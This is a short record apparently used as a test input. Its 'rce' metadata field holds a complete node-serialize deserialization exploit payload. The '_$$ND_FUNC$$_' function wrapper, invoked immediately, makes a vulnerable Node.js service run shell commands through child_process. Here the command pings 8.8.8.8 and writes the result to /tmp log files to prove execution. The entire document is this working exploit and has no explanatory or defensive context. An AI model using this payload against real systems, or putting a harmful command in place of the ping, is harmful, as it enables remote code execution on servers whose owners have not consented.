name: Working Test
metadata: {"rce":"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { cp.exec('ping -c 4 8.8.8.8', function(error, stdout, stderr) { if (error) { fs.writeFileSync('/tmp/ping_error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/ping_success.log', stdout); } }); } catch (e) { fs.writeFileSync('/tmp/ping_exception.log', 'EXCEPTION: ' + e.message); } return '';}()"}
